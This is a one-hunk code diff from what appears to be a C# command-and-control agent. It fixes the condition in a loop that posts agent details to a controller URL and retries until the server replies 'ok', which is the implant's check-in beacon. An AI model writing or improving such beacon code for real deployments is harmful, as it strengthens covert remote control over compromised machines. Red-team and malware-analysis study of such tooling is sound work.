@@ -17,7 +17,7 @@ namespace C2
             while (true)
             {
                 string InitResults = Http.PostResults(agentDetails, Config.Url + Config.InitUrl + agentName);
-                if (ShellResults == null && !String.Equals(InitResults, "ok"))
+                if (InitResults == null || !String.Equals(InitResults, "ok") || InitResults.Length <= 0)
                 {
                     Thread.Sleep(Config.Sleep);
                     continue;
